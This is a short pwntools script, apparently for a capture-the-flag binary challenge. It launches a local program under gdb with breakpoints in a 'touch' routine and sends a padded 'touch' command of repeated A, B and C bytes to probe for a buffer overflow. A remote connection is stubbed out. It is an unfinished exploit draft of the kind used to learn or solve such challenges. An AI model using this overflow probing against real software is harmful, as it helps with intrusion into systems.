#!/usr/bin/env python3

from pwn import ELF, process, remote, p32, gdb

bin = ELF("./chall/app")

p = process("./chall/app")
pid = gdb.attach(p, gdbscript="""
b * touch + 134
b * touch + 337
""")
#p = remote()

payload_1 = b"touch "
payload_1 += 50 * b"A"
payload_1 += b" "
payload_1 += 50 * b"B"
payload_1 += b" "
payload_1 += 12 * b"C"
p.sendline(payload_1)
#p.sendlineafter(b"$", payload_1)

p.interactive()